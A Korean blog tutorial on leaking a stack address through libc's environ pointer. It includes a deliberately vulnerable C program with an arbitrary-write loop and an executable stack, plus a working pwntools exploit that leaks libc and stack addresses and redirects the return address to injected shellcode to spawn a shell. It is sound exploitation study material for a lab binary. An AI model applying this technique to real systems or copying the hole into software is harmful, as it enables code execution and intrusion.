---
tistoryBlogName: k0n9
tistoryTitle: __environ을 이용한 스택 주소 leak
tistoryVisibility: "3"
tistoryCategory: "1136867"
tistorySkipModal: true
tistoryPostId: "40"
tistoryPostUrl: https://k0n9.tistory.com/40
---
stack address leak

libc_base를 알고있을 때 stack_address 를 알아낼 수 있는 기법이다.

라이브러리에서는 프로그램의 환경 변수를 참조해야 할 일이 있다. 이를 위해 libc.so.6에는 environ 포인터가 존재하고, 이는 프로그램의 환경 변수를 가리키고 있다. environ 포인터는 로더의 초기화 함수에 의해 초기화된다.

environ 변수의 오프셋 구하는 법

```c
objdump -D /lib/x86_64-linux-gnu/libc.so.6 | grep "environ"
```

![](https://i.imgur.com/Mcha9xL.png)

![](https://i.imgur.com/BgUqG3C.png)

environ에 stack 주소가 있는 것을 알 수 있다.

## 예제

```c
//gcc -zexecstack -no-pie -o enp enp.c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
long int buf_ptr = 0;
int main()
{
	char buf[1025];
	memset(buf, 0 ,1025);
	read(0, buf, 1024);
	buf_ptr = &buf; 
	long int overwrite_addr;
	long int value;
	
	for(int i=0; i < 10; i++) {
		printf("buf: %s", buf_ptr);
		fflush(stdout);
		printf("Addr: ");
		fflush(stdout);
        
		scanf("%lu", &overwrite_addr);
		printf("Value: ");
		fflush(stdout);
		scanf("%lu", &value);
		
		*(long int *)overwrite_addr = value;
	}
	
	return 0;
}
```

checksec
![](https://i.imgur.com/LO3Hi5n.png)


이 예제는 buf에 1024 바이트 만큼 입력받고 buf_ptr 에 buf 주소를 전달한다. 이후 루프를 돌면서 buf_ptr 주소의 값을 참조하여 출력하고 임의 주소 쓰기 취약점이 존재한다. 또한 NX bit 보호기법이 적용되어 있지 않다.

해당 예제는 임의 주소 쓰기 취약점을 이용해 buf_ptr 전역 변수를 덮어 원하는 위치에 있는 주소를 알아낼 수 있다. 이때 스택의 주소를 알아내기 위해서 사용할 수 있는 것이 libc.so.6라이브러리에 있는 environ 변수이다.

익스 순서

1. buf를 입력받을 때 셸코드를 입력한다.
2. 임의 주소 쓰기 취약점을 이용해 buf_ptr 를 특정 함수의 GOT로 덮어 라이브러리 주소를 구한다.
3. 다시 임의 주소 쓰기 취약점을 이용해 environ 주소를 buf_ptr에 덮어 stack address도 leak한다.
4. 스택주소를 구한 후 임의주소 쓰기로 ret을 shellcode로 overwrite한다.

```python
from pwn import *

# context.log_level = 'debug'

context(arch = "amd64", os='linux')

p = process("./enp")

shell = asm(shellcraft.sh())
read_got = 0x404030
buf_ptr = 0x0000000000404068
read_off = 0x114980
environ_off = 0x000000000221200
buf_rbp_off = 0x128

pause()

p.send(shell)

p.sendlineafter(b"Addr: ", str(buf_ptr))
p.sendlineafter(b"Value: ", str(read_got))

p.recvuntil(b"buf: ")
read_add = u64(p.recv(6)+b"\\x00\\x00")
libc = read_add - read_off
environ = libc + environ_off

p.sendlineafter(b"Addr: ", str(buf_ptr))
p.sendlineafter(b"Value: ", str(environ))

p.recvuntil(b"buf: ")
environ_add = u64(p.recv(6)+b"\\x00\\x00")
buf_add = environ_add - buf_rbp_off - 0x410
ret_add = buf_add + 0x418

for i in range(8):
    p.sendlineafter(b"Addr: ", str(ret_add))
    p.sendlineafter(b"Value: ", str(buf_add))

p.interactive()
```
![](https://i.imgur.com/AUyqyKb.png)
